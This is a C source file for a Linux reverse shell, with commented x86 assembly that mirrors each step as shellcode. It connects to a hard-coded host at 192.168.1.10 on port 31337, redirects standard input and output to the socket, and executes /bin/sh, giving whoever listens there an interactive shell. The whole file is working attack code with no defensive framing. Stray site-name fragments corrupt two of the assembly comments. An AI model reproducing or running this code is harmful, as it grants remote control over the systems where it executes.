#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
  
int
main(void) 
{
    int sockfd;  
    struct sockaddr_in attacker_addr;   
    socklen_t sinsize;
      
    /*
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80        ; make the calhappygeek.coml, eax contains sockfd                       
    mov esi, eax    ; esi now contains sockfd
    */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
  
    /*
    mov bl, 0x02    ; preparation for AF_INET
    push dword 0x0a01a8c0 ; (192.168.1.10)
    push word 0x697a ; port number 31337
    push word bx    ; push AF_INET
    inc bl          ; connect()
    mov ecx, esp    ; ecx contains pointer to sockaddr struct
    push byte 0x10  ; push socklen_t addrlen
    push ecx        ; push const struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to connect() args
    int 0x80
    */
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(31337);
    attacker_addr.sin_addr.s_addr = inet_addr("192.168.1.10");
    memset(&(attacker_addr.sin_zero),'\0',8);
    connect(sockfd, (struct sockaddr *)&attacker_addr, 
        sizeof(struct sockaddr));
  
    /*happygeek.com
    mov ebx, eax    ; ebx contains dupsockfd
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
    dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80        ; make the call
    jne dupfd       ; loop until 0
    */
    dup2(sockfd,0); // stdin
    dup2(sockfd,1); // stdout
    dup2(sockfd,2); // stderr
  
    /*
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80        ; make the call
    */
    execve("/bin/sh", NULL, NULL);
}
